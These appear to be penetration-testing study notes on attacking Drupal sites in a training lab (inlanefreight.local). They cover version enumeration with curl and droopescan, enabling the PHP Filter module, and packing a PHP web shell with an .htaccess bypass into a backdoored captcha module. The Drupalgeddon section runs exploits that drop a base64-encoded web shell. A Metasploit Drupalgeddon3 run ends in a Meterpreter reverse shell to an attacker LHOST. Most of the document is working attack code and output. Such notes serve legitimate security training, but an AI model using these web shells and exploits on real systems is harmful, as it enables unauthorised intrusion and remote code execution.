# Drupal

## Discovery & Enumeration
Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Here are a few interesting [statistics](https://websitebuilder.org/blog/drupal-statistics/) on Drupal gathered from various sources.
### Discovery/Footprinting
```sh
### A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt file`, via the page source, or clues in the robots.txt file such as references to `/node`
curl -s http://drupal.inlanefreight.local | grep Drupal

# Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes).
/node/<nodeid>

# 3 types of users by default:
- Administrator
- Authenticated User
- Anonymous
```
### Enumeration
```sh
# Newer installs of Drupal by default block access to the CHANGELOG.txt and README.txt files, so we may need to do further enumeration
# Enumerating the version number using the `CHANGELOG.txt`
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

droopescan scan drupal -u http://drupal.inlanefreight.local
```
## Attacking
### PHP Filter Module
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

Now write a PHP webshell and make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://domain.com/node/3`. From here, we could use a bash one-liner to obtain reverse shell access.
```sh
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. `Administration` > `Reports` > `Available updates`

Note: Location may differ based on the Drupal version and may be under the Extend menu.

From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

Once the module is installed, we can click on `Content` and create a new basic page.
### Uploading a Backdoored Module
```sh
# Choose a Drupal module from drupal.org website (example below)
https://www.drupal.org/project/captcha
https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create a PHP web shell with the contents:
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>

# Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

# The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install
<SNIP>

# Having admin access to the web > Manage > Extend on the sidebar > + Install new module > Browse to the backdoored Captcha archive and click `Install`
# Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
### Knowing Vulnerabilities
- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
#### Drupalgeddon
```sh
# pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's add a new admin user and then enable PHP Filter module
https://www.exploit-db.com/exploits/34992
https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
#### Drupalgeddon2
```sh
https://www.exploit-db.com/exploits/44448
python3 drupalgeddon2.py 
...
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt

# We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)

# Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

# Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

# Next, run the modified exploit script to upload our malicious PHP file.
python3 drupalgeddon2.py 
...
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php

# Finally, we can confirm remote code execution using `cURL`.
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
#### Drupalgeddon3
[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.
![](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/burp.png)
Once we have the session cookie, we can set up the exploit module as follows.
```sh
#### IN CASE (multi/http/drupal_drupageddon3) is not available, replicate the same with the exploit
exploit(unix/webapp/drupal_drupalgeddon2)

msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

# If successful, we will obtain a reverse shell on the target host.
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid
```

---

They have their tools to audit the CMS, like WPScan for WordPress. DroopeScan for Drupal.

Check **changelog.txt** to find the **version**.


```bash
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/drupal/index.html?highlight=drupal#drupal

https://www.exploit-db.com/exploits/41564
# Change $endpoint_path to /rest and the payload with a simple php code to have a webshell.

https://github.com/oways/SA-CORE-2018-004
https://github.com/dreadlocked/Drupalgeddon2

Check Modules > PHP Filter and enable it

droopescan scan drupal -u http://$IP
```

